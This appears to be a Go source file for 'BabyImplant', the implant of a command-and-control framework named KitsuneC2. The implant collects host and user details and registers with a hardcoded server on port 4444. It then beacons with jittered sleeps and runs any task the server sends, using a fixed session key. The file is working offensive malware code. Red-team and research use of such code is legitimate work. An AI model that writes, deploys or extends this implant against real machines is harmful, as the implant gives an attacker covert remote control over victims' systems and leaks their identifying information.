package main

import (
	"KitsuneC2/lib/communication"
	"KitsuneC2/lib/cryptography"
	"math"
	"math/rand"
	"net"
	"os"
	"os/user"
	"runtime"
	"strconv"
	"time"
)

const (
	implantName string = "BabyImplant"
	serverIp    string = "127.0.0.1"
	serverPort  int    = 4444

	callbackInterval int    = 5
	callbackJitter   int    = 2
	implantOs        string = runtime.GOOS
	ImplantArch      string = runtime.GOARCH
)

var (
	implantId       string = "00000000000000000000000000000000" //dynamically generated based on unique host features
	sessionKey      string = "thisis32bitlongpassphraseimusing" //TODO: dynamically generate on each message to provide PFS.
	shouldTerminate bool   = false
)

func main() {
	initialize()
	kitsuneLoop()
}

// main loop of the implant: Sleep for x amount of time, check for server commands, execute commands
func kitsuneLoop() {
	for !shouldTerminate {
		var waitTime = math.Abs(float64(callbackInterval + int(float32(callbackJitter)*(0.5-rand.Float32()))))
		time.Sleep(time.Duration(waitTime) * time.Second)

		conn, err := net.Dial("tcp", serverIp+":"+strconv.Itoa(serverPort))
		if err != nil {
			continue
		}

		receivedTask, taskArguments, err := checkIn(conn)
		if err != nil {
			conn.Close()
			continue
		}

		go executeTask(receivedTask, taskArguments)
		conn.Close()
	}
}

// Gathers basic information about the system, generates a unque implant ID, and sends a message of type "ImplantRegister" to the server.
func initialize() error {
	var currentUser, _ = user.Current()
	var hostname, _ = os.Hostname()
	implantId = cryptography.GenerateMd5FromStrings(hostname, currentUser.Username, implantName) //Generates unique ID based on hostname, username and implantName

	msg := communication.ImplantRegister{ImplantId: implantId, ImplantName: implantName, Hostname: hostname, Username: currentUser.Username, UID: currentUser.Uid, GID: currentUser.Gid}

	conn, err := net.Dial("tcp", serverIp+":"+strconv.Itoa(serverPort))
	if err != nil {
		return err
	}
	defer conn.Close()
	err = SendEnvelopeToServer(conn, implantId, 0, msg, []byte(sessionKey))
	if err != nil {
		return err
	}
	return nil
}

// Sends message of type "ImplantCheckin" to server and returns (if any) a task with it's arguments.
func checkIn(conn net.Conn) (int, interface{}, error) {
	msg := communication.ImplantCheckin{ImplantId: implantId}

	err := SendEnvelopeToServer(conn, implantId, 1, msg, []byte(sessionKey))
	if err != nil {
		return -1, nil, err
	}

	messageType, data, err := ReceiveEnvelopeFromServer(conn, []byte(sessionKey))
	if err != nil {
		return -1, nil, err
	}
	return messageType, data, nil
}

func executeTask(taskType int, arguments interface{}) {
	conn, err := net.Dial("tcp", serverIp+":"+strconv.Itoa(serverPort))
	if err != nil {
		return
	}
	defer conn.Close()

	handlerFunc := MessageTypeToFunc[taskType]
	handlerFunc(conn, arguments)
}
